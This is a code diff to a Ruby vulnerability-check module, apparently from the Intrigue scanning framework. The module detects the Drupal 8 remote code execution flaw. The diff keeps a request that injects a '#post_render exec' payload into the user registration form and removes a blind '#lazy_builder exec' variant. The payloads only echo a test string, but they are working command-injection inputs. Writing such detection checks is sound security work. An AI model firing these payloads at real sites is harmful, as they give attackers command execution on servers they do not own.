@@ -68,16 +68,8 @@ module Intrigue
         post_body = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=echo #{randomstr}"
         r = http_request(:post, "#{uri}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                         nil, {}, post_body)
-        return true if r.body_utf8.include? randomstr
 
-        # first check didn't work; yolo second check (blind check)
-        _log 'First Drupal 8 check did not work; attempting blind check.'
-
-        post_body2 = 'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=echo abc'
-        r2 = http_request(:post, "#{uri}/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
-                         nil, {}, post_body2)
-
-        r2.body_utf8.include?('The website encountered an unexpected error. Please try again later.') && r2.code == '500'
+        r.body_utf8.include? randomstr
       end
 
       def check
@@ -85,7 +77,7 @@ module Intrigue
         version = detect_drupal_version(uri)
         return if version.nil?
 
-        _log_good "Drupal #{version} detected; running respective check."
+        _log_good "Drupal #{version} possibly detected; running respective check."
         vuln = version == 8 ? drupal_8_check(uri) : drupal_7_check(uri)
         
         _log 'Target does not appear to be vulnerable.' unless vuln
